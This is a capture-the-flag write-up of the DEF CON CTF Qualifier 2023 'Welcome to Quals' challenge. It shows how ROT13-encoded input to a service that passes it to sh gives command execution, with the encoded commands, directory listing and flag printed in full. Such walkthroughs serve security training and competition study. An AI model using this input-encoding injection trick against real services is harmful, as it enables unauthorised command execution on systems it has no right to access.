# Welcome to Quals

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Find the flag](#find-the-flag)
4. [Conclusion](#conclusion)

## Overview

- 517 solves / 10 points
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

**Host:** welcome-to-quals-vfnva65rlchqk.shellweplayaga.me

**Port:** 10001

## Find the flag

**In this challenge, we can `nc` into the challenge:**
```shell
┌[siunam♥earth]-(~/ctf/DEF-CON-CTF-Qualifier-2023/Intro)-[2023.05.27|09:21:37(HKT)]
└> nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{DeveloperHousing4937n23:OvJ4QRrhtuuyI9jxifoGR2VHYKcqY7qJvYuwtijTLTfm5-71}
Hello challenger, enter your payload below:

```

In here, we can enter a payload...

Ah... What payload??

```shell
┌[siunam♥earth]-(~/ctf/DEF-CON-CTF-Qualifier-2023/Intro)-[2023.05.27|09:23:08(HKT)]
└> nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{DeveloperHousing4937n23:OvJ4QRrhtuuyI9jxifoGR2VHYKcqY7qJvYuwtijTLTfm5-71}
Hello challenger, enter your payload below:
flagplzzzzz
sh: 1: syntcymmmmm: not found
```

Oh! Looks like it's using `sh` to execute our input.

However, **our input is rotated**??

**Let's rotate it back in [CyberChef](https://gchq.github.io/CyberChef/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DEF-CON-CTF-Qualifier-2023/images/Pasted%20image%2020230527092450.png)

Yep! ROT13.

**So, in order to execute arbitrary shell commands, we can rotate our payload first:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DEF-CON-CTF-Qualifier-2023/images/Pasted%20image%2020230527093255.png)

```shell
┌[siunam♥earth]-(~/ctf/DEF-CON-CTF-Qualifier-2023/Intro)-[2023.05.27|09:32:23(HKT)]
└> nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{DeveloperHousing4937n23:OvJ4QRrhtuuyI9jxifoGR2VHYKcqY7qJvYuwtijTLTfm5-71}
Hello challenger, enter your payload below:
jubnzv;vq
user
uid=1000(user) gid=1000(user) groups=1000(user)
```

Nice!

**Let's find the flag!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DEF-CON-CTF-Qualifier-2023/images/Pasted%20image%2020230527093325.png)

```shell
┌[siunam♥earth]-(~/ctf/DEF-CON-CTF-Qualifier-2023/Intro)-[2023.05.27|09:32:41(HKT)]
└> nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{DeveloperHousing4937n23:OvJ4QRrhtuuyI9jxifoGR2VHYKcqY7qJvYuwtijTLTfm5-71}
Hello challenger, enter your payload below:
yf -ynu /
total 68K
drwxr-xr-x   1 root root 4.0K May 27 01:33 .
drwxr-xr-x   1 root root 4.0K May 27 01:33 ..
-rwxr-xr-x   1 root root    0 May 27 01:33 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 25 14:03 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Apr 18  2022 boot
drwxr-xr-x   5 root root  340 May 27 01:33 dev
drwxr-xr-x   1 root root 4.0K May 27 01:33 etc
drwxr-xr-x   2 root root 4.0K Apr 18  2022 home
lrwxrwxrwx   1 root root    7 Apr 25 14:03 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 25 14:03 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Apr 25 14:03 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Apr 25 14:03 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4.0K Apr 25 14:03 media
drwxr-xr-x   2 root root 4.0K Apr 25 14:03 mnt
drwxr-xr-x   1 root root 4.0K May 26 22:15 opt
dr-xr-xr-x 312 root root    0 May 27 01:33 proc
drwx------   2 root root 4.0K Apr 25 14:06 root
drwxr-xr-x   5 root root 4.0K Apr 25 14:06 run
lrwxrwxrwx   1 root root    8 Apr 25 14:03 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Apr 25 14:03 srv
dr-xr-xr-x  12 root root    0 May 27 01:33 sys
drwxrwxrwt   2 root root 4.0K Apr 25 14:06 tmp
drwxr-xr-x   1 root root 4.0K Apr 25 14:03 usr
drwxr-xr-x   1 root root 4.0K Apr 25 14:06 var
-rw-r--r--   1 1001 1002  116 May 27 01:33 welcome_flag.txt
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DEF-CON-CTF-Qualifier-2023/images/Pasted%20image%2020230527093353.png)

```shell
┌[siunam♥earth]-(~/ctf/DEF-CON-CTF-Qualifier-2023/Intro)-[2023.05.27|09:33:36(HKT)]
└> nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{DeveloperHousing4937n23:OvJ4QRrhtuuyI9jxifoGR2VHYKcqY7qJvYuwtijTLTfm5-71}
Hello challenger, enter your payload below:
png /jrypbzr_synt.gkg
flag{DeveloperHousing4937n23:xURpjoZI0L99xoYdBTVcN5K8uZ854vBkdRA4V3MXN6p4IcsN4qGfzBHUhfq1Yw_MqPOxtrp9GloRmZSdIJFsUQ}
```

- **Flag: `flag{DeveloperHousing4937n23:xURpjoZI0L99xoYdBTVcN5K8uZ854vBkdRA4V3MXN6p4IcsN4qGfzBHUhfq1Yw_MqPOxtrp9GloRmZSdIJFsUQ}`**

## Conclusion

What we've learned:

1. Executing Shell Commands With ROT13